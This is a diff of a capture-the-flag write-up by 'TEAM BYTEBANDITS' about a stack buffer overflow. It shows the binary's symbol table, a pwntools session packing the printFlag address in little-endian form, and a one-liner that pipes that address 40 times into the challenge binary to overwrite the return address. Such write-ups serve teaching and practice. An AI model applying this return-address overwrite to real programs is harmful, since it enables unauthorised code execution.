@@ -21,18 +21,19 @@ We first debug the binary using GDB debugger. When overflowed look for EBP and E
   **0804856d T printFlag** U puts@@GLIBC_2.0 080484e0 t register_tm_clones 08048470 T _start 0804a040 B stdout@@GLIBC_2.0
   0804a034 D __TMC_END__ 080484a0 T __x86.get_pc_thunk.bx
 ```
-hulkbuster@Jarvis:~/Downloads$
 
 Thus the vulnerability is found and is exploited by over flowing (input more than the stack size) it to the address of "print_flag" function.
 
-Note: The payload passed should be in little-endian format for this 32-bit system.
+*Note: The payload passed should be in little-endian format for this 32-bit system.*
 
+```bash
 hulkbuster@Jarvis:~/Downloads$ python Python 2.7.6 (default, Jun 22 2015, 17:58:13) [GCC 4.8.2] on linux2 Type "help", "copyright", "credits" or "license" for more information. >>> from pwn import * >>> p32(0x0804856d,endian="little") 'm\x85\x04\x08' >>>
-
+```
 Thus the above payload reveals the flag for this challenge.
 
+```bash
 python -c 'print "m\x85\x04\x08"*40' | ./3d726802521a9ce2b24e2c3baf039915e48ad056.
+```
 
-Regards
 
 TEAM BYTEBANDITS
